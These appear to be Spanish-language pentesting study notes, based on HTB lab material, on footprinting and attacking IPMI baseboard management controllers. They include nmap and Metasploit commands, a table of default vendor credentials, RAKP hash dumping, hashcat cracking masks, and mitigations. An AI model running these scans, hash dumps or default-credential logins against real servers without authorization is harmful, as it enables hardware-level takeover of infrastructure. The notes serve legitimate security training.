# IPMI – Intelligent Platform Management Interface

---

## 📌 Introducción

IPMI ([Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)) es un estándar de gestión remota de hardware diseñado para permitir la administración y monitoreo de servidores **independientemente del sistema operativo**.

Esto significa que podemos administrar un servidor incluso si:

* Está apagado
* Está corrompido
* El sistema operativo no arranca
* El BIOS está mal configurado
* El sistema está congelado

IPMI funciona como un **subsistema autónomo** dentro del servidor.

> 🔥 Desde el punto de vista de un pentester, acceso a IPMI ≈ acceso físico al servidor.

---

# 🧠 ¿Qué problema resuelve IPMI?

Imaginemos un datacenter con cientos de servidores.

Si un servidor se cuelga:

* ¿Un técnico debería viajar físicamente?
* ¿Conectar teclado y monitor?
* ¿Reiniciarlo manualmente?

IPMI permite:

* Encender o apagar el servidor remotamente
* Reiniciarlo
* Acceder a la consola serial
* Modificar BIOS antes del boot
* Reinstalar el sistema operativo
* Ver logs de hardware
* Monitorear temperatura, ventiladores y voltajes

Todo esto sin necesidad de acceso al sistema operativo.

---

# 🏗 Arquitectura Interna de IPMI

IPMI no es solo un protocolo, sino un conjunto de componentes.

## 1️⃣ BMC – Baseboard Management Controller

Es el componente más importante.

* Es un microcontrolador integrado en la motherboard
* Generalmente es un pequeño sistema ARM corriendo Linux embebido
* Tiene su propia interfaz de red
* Funciona incluso si el servidor está apagado

El BMC es literalmente una "computadora dentro de la computadora".

---

## 2️⃣ IPMB – Intelligent Platform Management Bus

Amplía el `BMC`.
Bus interno que permite comunicación entre:

* Sensores
* Fuente de alimentación
* Ventiladores
* Componentes internos

---

## 3️⃣ ICMB – Intelligent Chassis Management Bus

Permite comunicación entre múltiples chasis (racks completos).

---

## 4️⃣ Memoria IPMI

Almacena:

* System Event Log (SEL)
* Información de inventario
* Registros de fallos

---

## 5️⃣ Interfaces de comunicación

IPMI puede comunicarse mediante:

* Interfaz LAN
* Serial over LAN
* PCI Management Bus
* ICMB

---



---

# 🔍 Footprinting con Nmap

# IPMI – Footprinting del Servicio 

---

## 📌 Introducción

En esta sección vamos a profundizar específicamente en la fase de **Footprinting de IPMI**, es decir:

> Cómo identificar, reconocer y evaluar la exposición de un BMC dentro de una red durante un pentest.

Este paso es crítico en entornos internos porque IPMI puede convertirse en uno de los vectores de compromiso más potentes dentro de una infraestructura.

---

# 🌐 Puerto y Protocolo

IPMI opera principalmente sobre:

```
UDP 623
```

Servicio identificado comúnmente como:

```
asf-rmcp
```

Cuando vemos UDP 623 abierto en un escaneo interno, debemos sospechar inmediatamente de un BMC expuesto.

### 🔎 ¿Qué significa esto?

* **ASF** → Alert Standard Format
* **RMCP** → Remote Management Control Protocol

RMCP es el protocolo que encapsula los mensajes IPMI cuando se transmiten por red.

Si en un escaneo interno vemos UDP 623 abierto, debemos asumir inmediatamente:

> "Este host probablemente tiene un BMC activo"

---


---

# 🏗 Cómo se implementa un BMC

Existen dos formas principales:

### 1️⃣ Integrado en la motherboard

La mayoría de servidores empresariales ya lo incluyen.

### 2️⃣ Como tarjeta PCI adicional

En servidores más antiguos o configuraciones específicas.

En ambos casos, el BMC:

* Está conectado directamente al hardware
* Tiene acceso a sensores físicos
* Puede controlar energía, BIOS y almacenamiento

---

# 🏢 BMCs más comunes en entornos reales

Durante pentests internos suelen encontrarse:

* HP iLO
* Dell DRAC / iDRAC
* Supermicro IPMI

Cada uno es una implementación propietaria sobre el estándar IPMI.

Aunque el fabricante cambia la interfaz, el protocolo base sigue siendo IPMI.

---

# 🔓 Por qué el acceso a BMC es crítico

Si obtenemos acceso a un BMC podemos:

* Encender o apagar el servidor
* Reiniciarlo
* Acceder a consola remota
* Montar una ISO
* Reinstalar el sistema operativo
* Modificar configuraciones BIOS

Desde un punto de vista ofensivo:

Acceso a BMC ≈ acceso físico remoto

Esto supera muchas técnicas tradicionales de explotación porque no depende del sistema operativo.

---

# 🖥 Interfaces expuestas por los BMC

Un BMC típicamente expone:

### 🌐 Consola Web

Panel de administración accesible por HTTP o HTTPS.

### 🖥 Acceso remoto por línea de comandos

Puede ofrecer:

* Telnet
* SSH

### 📡 UDP 623

Puerto utilizado específicamente para el protocolo IPMI.

Un mismo servidor puede exponer los tres simultáneamente.

---

# 🔍 Footprinting con Nmap

Comando utilizado en HTB:

```bash
sudo nmap -sU --script ipmi-version -p 623 <target>
```

### 🔎 Desglose del comando

* `-sU` → Escaneo UDP
* `-p 623` → Puerto IPMI
* `--script ipmi-version` → [Script NSE](https://nmap.org/nsedoc/scripts/ipmi-version.html) que identifica versión

---

## 📤 Output de ejemplo

```
PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
```

---

# 🧩 Análisis detallado del output

### 1️⃣ Puerto abierto

Confirma que el BMC está accesible.

### 2️⃣ Versión IPMI 2.0

Importante porque:

* Soporta RAKP
* Permite extracción de hashes

### 3️⃣ Métodos de autenticación

Nos indica:

* Qué tipos de autenticación están habilitados
* Si acepta usuarios no nulos

### 4️⃣ MAC Address

Podemos identificar fabricante por OUI.

Esto nos permite:

* Saber si es HP
* Dell
* Supermicro

Y ajustar estrategia.

---

# 🧠 Flujo 

Cuando encontramos UDP 623 abierto:

1. Confirmar versión con Nmap
2. Identificar fabricante por MAC
3. Buscar si hay consola web expuesta
4. Intentar credenciales default
5. Evaluar extracción de hashes RAKP
6. Analizar posible reutilización de credenciales

---

# ⚠ Riesgos comunes observados en auditorías reales

* BMC en misma VLAN que usuarios
* Password default sin cambiar
* Acceso sin segmentación
* Firmware desactualizado
* Consola web expuesta sin MFA

En muchos entornos el BMC queda olvidado porque:

"No es el sistema operativo"

Pero desde seguridad ofensiva es uno de los puntos más críticos.

---


HTB muestra el siguiente ejemplo:

```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

Output:

```
PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)
```

### 🧩 ¿Qué nos dice esto?

* El puerto UDP 623 está abierto
* Está usando IPMI versión 2.0
* Soporta autenticación
* Podemos identificar el fabricante por la MAC

Ya con esto sabemos que estamos frente a un BMC.

---

# 🔎 Escaneo con Metasploit

## Módulo de descubrimiento de versión

También podemos usar el [módulo](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_version/) de análisis de Metasploit `auxiliary/scanner/ipmi/ipmi_version`:

```bash
use auxiliary/scanner/ipmi/ipmi_version
set rhosts 10.129.42.195
run
```

Output:

```
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
```

Aquí vemos:

* Métodos de autenticación
* Versiones soportadas
* Hashes posibles (MD5, MD2)

---

# 🔑 Credenciales por defecto comunes

| Producto   | Usuario       | Password       |
| ---------- | ------------- | -------------- |
| Dell iDRAC | root          | calvin         |
| HP iLO     | Administrator | random 8 chars |
| Supermicro | ADMIN         | ADMIN          |

⚠️ En pentests internos es MUY común que no hayan cambiado estas credenciales.

También es fundamental probar las contraseñas predeterminadas conocidas en cualquier servicio que encontremos, estas contraseñas predeterminadas de `BMC` pueden permitirnos acceder a la consola web o incluso a la línea de comandos mediante `SSH` o `Telnet`.

---

# 🚨 Vulnerabilidad Crítica – RAKP (IPMI 2.0)

Aquí viene lo realmente interesante.

Durante el proceso de autenticación RAKP:

👉 El servidor envía un hash SHA1 o MD5 del password antes de completar autenticación.

Esto permite:

* Obtener hash de cualquier usuario válido
* Crackearlo offline
* Intentar reutilización de password

No es exactamente un bug, es un problema de diseño del protocolo.

---

# 🧪 Extracción de Hashes con Metasploit

```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts 10.129.42.195
run
```

Output:

```
[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
```

Esto significa:

* Obtuvimos el hash
* El módulo logró crackearlo
* La password era ADMIN

🔥 En un entorno real esto puede llevar a:

* Acceso root a servidores
* Reinstalación del SO
* Movimiento lateral
* Persistencia

---

# 🔓 Crackeo con Hashcat

Modo específico para IPMI:

```
hashcat -m 7300 ipmi.txt wordlist.txt
```

Para HP iLO default:

```
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

Este ataque prueba todas las combinaciones de:

* Dígitos
* Letras mayúsculas
* 8 caracteres

---

# 🧨 ¿Por qué es tan grave IPMI expuesto?

Porque permite:

* Power cycling del servidor
* Montar ISO remotamente
* Acceso consola
* Cambiar BIOS
* Extraer logs
* Reinstalar sistema

Desde el punto de vista ofensivo:

IPMI = Control total del hardware.

---

# 🛡 Mitigaciones

No hay fix directo para RAKP.

Buenas prácticas:

* Cambiar credenciales por defecto
* Passwords extremadamente largas
* Segmentación de red
* Nunca exponer BMC a internet
* Filtrar UDP 623
* ACL restrictivas

---

# 🧭 Flujo mental para Pentesting Interno

Cuando haces un pentest interno y ves:

```
UDP 623 abierto
```

Checklist mental:

1. Confirmar versión con Nmap
2. Intentar credenciales default
3. Extraer hashes con Metasploit
4. Crackear offline
5. Probar reutilización de credenciales
6. Intentar acceso web / SSH / Telnet

---

# 🎯 Conclusión Técnica

IPMI es extremadamente común en entornos corporativos.

Es frecuente encontrar:

* Passwords default
* Passwords débiles
* Reutilización en servidores críticos

En muchos casos, comprometer IPMI es el pivot más potente dentro de una red interna.

---

# 🧠 Concepto Clave Final

IPMI no es un servicio más.

Es una puerta directa al hardware.

Si lo comprometés, no estás explotando una aplicación.

Estás tomando control físico remoto del servidor.

---


